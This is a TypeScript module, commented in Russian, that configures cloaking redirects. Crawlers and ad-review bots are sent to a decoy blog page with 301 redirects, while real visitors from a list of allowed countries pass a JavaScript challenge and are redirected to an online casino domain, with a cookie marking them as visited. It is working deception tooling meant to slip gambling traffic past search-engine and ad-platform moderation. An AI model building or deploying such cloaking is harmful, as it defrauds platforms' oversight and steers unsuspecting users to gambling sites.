// Конфигурация редиректов для клоакинга

export interface RedirectConfig {
  url: string;
  status: 301 | 302 | 303 | 307 | 308;
  headers?: Record<string, string>;
  description: string;
}

export interface CloakingConfig {
  // URL для ботов
  botRedirect: string;
  
  // URL для реальных пользователей
  realUserRedirect: string;
  
  // URL для JS challenge
  jsChallengeUrl: string;
  
  // Разрешенные страны
  allowedCountries: string[];
  
  // Настройки куки
  cookieName: string;
  cookieMaxAge: number;
  
  // Настройки кэширования
  cacheControl: string;
}

// Конфигурация по умолчанию
export const DEFAULT_CLOAKING_CONFIG: CloakingConfig = {
  botRedirect: 'https://www.gamixlabs.com/blog.html',
  realUserRedirect: 'https://galaxy-casino.live',
  jsChallengeUrl: '/js-challenge.html',
  allowedCountries: ['AZ', 'RU', 'KZ', 'UA', 'BY', 'UZ', 'AM', 'GE', 'MD', 'RO', 'BG', 'HR', 'SI', 'SK', 'CZ', 'PL', 'HU', 'EE', 'LV', 'LT', 'MT', 'CY', 'GR', 'IT', 'ES', 'PT', 'FR', 'BE', 'NL', 'DE', 'AT', 'CH', 'LI', 'LU', 'MC', 'AD', 'GB', 'IE', 'IS', 'NO', 'SE', 'DK', 'FI', 'AL', 'MK', 'RS', 'ME', 'BA', 'XK', 'TR'],
  cookieName: 'galaxy_visited',
  cookieMaxAge: 60 * 60 * 24 * 30, // 30 дней
  cacheControl: 'no-cache, no-store, must-revalidate'
};

// Получение конфигурации редиректа для ботов
export function getBotRedirectConfig(botType?: string): RedirectConfig {
  const configs: Record<string, RedirectConfig> = {
    search: {
      url: DEFAULT_CLOAKING_CONFIG.botRedirect,
      status: 301,
      headers: {
        'Cache-Control': DEFAULT_CLOAKING_CONFIG.cacheControl,
        'X-Robots-Tag': 'noindex, nofollow',
        'X-Bot-Type': 'search'
      },
      description: 'Search engine bot redirect'
    },
    
    social: {
      url: DEFAULT_CLOAKING_CONFIG.botRedirect,
      status: 301,
      headers: {
        'Cache-Control': DEFAULT_CLOAKING_CONFIG.cacheControl,
        'X-Robots-Tag': 'noindex, nofollow',
        'X-Bot-Type': 'social'
      },
      description: 'Social media bot redirect'
    },
    
    advertising: {
      url: DEFAULT_CLOAKING_CONFIG.botRedirect,
      status: 301,
      headers: {
        'Cache-Control': DEFAULT_CLOAKING_CONFIG.cacheControl,
        'X-Robots-Tag': 'noindex, nofollow',
        'X-Bot-Type': 'advertising'
      },
      description: 'Advertising bot redirect'
    },
    
    automation: {
      url: DEFAULT_CLOAKING_CONFIG.botRedirect,
      status: 301,
      headers: {
        'Cache-Control': DEFAULT_CLOAKING_CONFIG.cacheControl,
        'X-Robots-Tag': 'noindex, nofollow',
        'X-Bot-Type': 'automation'
      },
      description: 'Automation tool redirect'
    },
    
    script: {
      url: DEFAULT_CLOAKING_CONFIG.botRedirect,
      status: 301,
      headers: {
        'Cache-Control': DEFAULT_CLOAKING_CONFIG.cacheControl,
        'X-Robots-Tag': 'noindex, nofollow',
        'X-Bot-Type': 'script'
      },
      description: 'Script/utility redirect'
    },
    
    default: {
      url: DEFAULT_CLOAKING_CONFIG.botRedirect,
      status: 301,
      headers: {
        'Cache-Control': DEFAULT_CLOAKING_CONFIG.cacheControl,
        'X-Robots-Tag': 'noindex, nofollow',
        'X-Bot-Type': 'unknown'
      },
      description: 'Default bot redirect'
    }
  };
  
  return configs[botType || 'default'] || configs.default;
}

// Получение конфигурации редиректа для реальных пользователей
export function getRealUserRedirectConfig(): RedirectConfig {
  return {
    url: DEFAULT_CLOAKING_CONFIG.realUserRedirect,
    status: 302,
    headers: {
      'Cache-Control': DEFAULT_CLOAKING_CONFIG.cacheControl,
      'X-User-Type': 'real',
      'X-Redirect-Reason': 'verified-user'
    },
    description: 'Real user redirect to main site'
  };
}

// Получение конфигурации для JS challenge
export function getJSChallengeConfig(): Omit<RedirectConfig, 'status'> & { status: 200 } {
  return {
    url: DEFAULT_CLOAKING_CONFIG.jsChallengeUrl,
    status: 200,
    headers: {
      'Cache-Control': 'no-cache, no-store, must-revalidate',
      'X-Challenge-Type': 'javascript',
      'Content-Type': 'text/html'
    },
    description: 'JavaScript challenge page'
  };
}

// Создание Response с редиректом
export function createRedirectResponse(config: RedirectConfig): Response {
  const response = new Response(null, {
    status: config.status,
    headers: {
      'Location': config.url,
      'Cache-Control': config.headers?.['Cache-Control'] || DEFAULT_CLOAKING_CONFIG.cacheControl,
      ...config.headers
    }
  });
  
  return response;
}

// Создание Response с JS challenge
export function createJSChallengeResponse(htmlContent: string): Response {
  const config = getJSChallengeConfig();
  return new Response(htmlContent, {
    status: config.status,
    headers: {
      'Content-Type': 'text/html; charset=utf-8',
      'Cache-Control': config.headers?.['Cache-Control'] || 'no-cache, no-store, must-revalidate',
      'X-Challenge-Type': 'javascript',
      'X-Frame-Options': 'DENY',
      'X-Content-Type-Options': 'nosniff',
      ...config.headers
    }
  });
}

// Проверка куки visited
export function hasVisitedCookie(request: Request, cookieName: string = DEFAULT_CLOAKING_CONFIG.cookieName): boolean {
  const cookie = request.headers.get('cookie');
  if (!cookie) return false;
  
  const cookies = cookie.split(';').map(c => c.trim());
  return cookies.some(c => c.startsWith(`${cookieName}=`));
}

// Установка куки visited
export function setVisitedCookie(response: Response, cookieName: string = DEFAULT_CLOAKING_CONFIG.cookieName): void {
  const cookieValue = `${cookieName}=true; Path=/; Max-Age=${DEFAULT_CLOAKING_CONFIG.cookieMaxAge}; HttpOnly; Secure; SameSite=Lax`;
  response.headers.set('Set-Cookie', cookieValue);
}
